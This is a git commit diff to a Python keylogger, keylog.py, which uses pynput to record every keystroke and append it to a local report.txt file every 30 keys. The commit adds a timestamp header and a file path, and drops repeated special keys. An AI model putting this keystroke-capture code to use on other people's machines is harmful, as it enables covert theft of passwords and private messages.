c6b0c359ab8e2ff041560ef300a60769f6a4622b
Ian Chen <71509578+ianchu0317@users.noreply.github.com>
2022-02-19 10:57:25 -0300

    added path, removed repeated special keys

--- keylog.py
+++ keylog.py
@@ -1,4 +1,3 @@
-from string import printable
 from unittest import FunctionTestCase
 from pynput.keyboard import Key, Listener
 import os
@@ -10,16 +9,23 @@ SPECIAL_KEYS = {Key.enter : '\n', Key.tab : '\t', Key.space : ' ',
 BUFFER = list()
 PREVIOUS_KEY = None
 REPORT_COUNTER = 0
+REPORT_FILE_PATH = os.path.join(os.getcwd(), "report.txt")
 
+# Write local hour and day on report
+with open(REPORT_FILE_PATH, "a") as file:
+    file.write("\n-----------\n")
+    file.write(f"{time.asctime()}\n")
+    
+# Write report to report.txt
 def report():
     global BUFFER
     global REPORT_COUNTER
+    global REPORT_FILE_PATH
 
-    with open("report.txt", "a") as file:
+    with open(REPORT_FILE_PATH, "a") as file:
         file.write("".join(BUFFER))
     BUFFER = []
     REPORT_COUNTER = 0
-
 
 
 # When key is pressed
@@ -30,24 +36,25 @@ def on_press(key):
     global REPORT_COUNTER
 
     try:
-        BUFFER.append(key.char)    
-    
+        BUFFER.append(key.char)
+
     except AttributeError: 
-        if key in SPECIAL_KEYS:
+        if key in SPECIAL_KEYS and key != PREVIOUS_KEY:
             BUFFER.append(SPECIAL_KEYS.get(key)) 
         elif key == Key.backspace and len(BUFFER) > 0:
             del BUFFER[-1]
         elif key == Key.esc:
             return False
+
     PREVIOUS_KEY = key
     REPORT_COUNTER += 1
     if REPORT_COUNTER == 30:
         report()
+    
 
 # When key is released
 def on_release(key):
     pass
-
 
 # Start listener
 if __name__ == '__main__':
